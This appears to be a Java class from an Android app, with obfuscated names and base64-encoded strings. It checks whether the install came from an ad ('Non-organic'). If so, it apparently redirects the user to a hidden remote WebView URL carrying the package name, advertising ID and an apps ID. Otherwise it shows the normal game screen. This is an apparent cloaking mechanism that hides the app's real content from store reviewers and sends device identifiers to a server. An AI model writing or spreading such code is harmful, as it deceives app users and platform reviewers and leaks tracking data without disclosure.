package cam.cradev.pirat2.crapirafd.kg;

import android.content.Intent;
import android.os.Build;
import android.util.Log;

import androidx.annotation.RequiresApi;

import cam.cradev.pirat2.crapirafd.CP;
import cam.cradev.pirat2.crapirafd.Pppaaa;
import cam.cradev.pirat2.crapirafd.RandomText;
import cam.cradev.pirat2.crapirafd.acti.MainActivity;
import cam.cradev.pirat2.crapirafd.acti.Web1;

public class Kg {

    @RequiresApi(api = Build.VERSION_CODES.O)
    public static void kg(CP cp){

        String ksd = Pppaaa.ldfjq;
        String lfso = null;
        if (ksd.equals(RandomText.vvv("Tm9uLW9yZ2FuaWM="))){
            lfso = CP.kdfs + Pppaaa.linswq;
            Intent intent = new Intent(cp.getApplicationContext(), Web1.class);
            intent.putExtra("ueghjd",lfso);
            cp.startActivity(intent);
            cp.finishAffinity();
        }else if(Pppaaa.kidhc != null) {
            lfso = CP.kdfs +Pppaaa.lonca;
            Intent intent = new Intent(cp.getApplicationContext(), Web1.class);
            intent.putExtra("ueghjd",lfso);
            cp.startActivity(intent);
            cp.finishAffinity();
        }else {
            if (CP.kfsf.equals(RandomText.vvv("Tk8="))) {
                cp.startActivity(new Intent(cp.getApplicationContext(), MainActivity.class));
                cp.finishAffinity();
            }else {

                StringBuilder kdsorjmkwq = new StringBuilder();
                kdsorjmkwq.append(CP.kfsf);
                kdsorjmkwq.append(RandomText.vvv("P2J1bmRsZT0="));
                kdsorjmkwq.append(cp.getPackageName());
                kdsorjmkwq.append(RandomText.vvv("JmFkX2lkPQ=="));
                kdsorjmkwq.append(Pppaaa.ldfjd);
                kdsorjmkwq.append(RandomText.vvv("JmFwcHNfaWQ9"));
                kdsorjmkwq.append(Pppaaa.lfs);

                lfso = CP.kdfs + kdsorjmkwq.toString();
                Intent intent = new Intent(cp.getApplicationContext(), Web1.class);
                intent.putExtra("ueghjd",lfso);
                cp.startActivity(intent);
                cp.finishAffinity();
            }
        }


    }
}
